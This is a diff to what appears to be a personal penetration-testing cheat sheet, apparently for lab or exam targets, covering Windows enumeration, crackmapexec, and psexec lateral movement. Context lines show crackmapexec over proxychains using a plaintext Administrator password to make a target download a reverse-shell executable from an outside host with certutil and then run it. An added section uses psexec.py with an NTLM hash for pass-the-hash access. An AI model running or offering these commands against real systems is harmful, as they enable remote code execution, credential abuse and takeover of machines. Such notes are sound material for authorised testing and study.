@@ -37,6 +37,8 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 > whoami /priv
 > whoami /groups
 > net user | Get-LocalGroup
+> net user /domain
+  > add names to usernames.txt
 > net user admin
 > net localgroup | Get-LocalGroup
 > net localgroup Administrators | Get-LocalGroupMember Administrators
@@ -98,7 +100,6 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 
 ```
 
-
 ## crackmapexec
 ```bash
 # local auth
@@ -125,6 +126,21 @@ crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME
 crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
 proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'certutil -urlcache -f http://192.168.45.176:8000/revshell7777.exe C:\Users\Public\revshell7777.exe'
 proxychains -q crackmapexec winrm 172.16.80.21 -u Administrator -p 'vau!XCKjNQBv2$' -x 'C:\Users\Public\revshell7777.exe'
+
+```
+
+## psexec
+```bash
+psexec.py -hashes '2f2b8d5d4d756a2c72c554580f970c14:2f2b8d5d4d756a2c72c554580f970c14' Administrator@192.168.190.247
+
+
+
+When psexec not working
+  - crackmapexec smb -x whoami
+  - xfreerdp
+  - winrm
+  - See if we can upload files through shares using smbclient
+ 
 
 ```
 
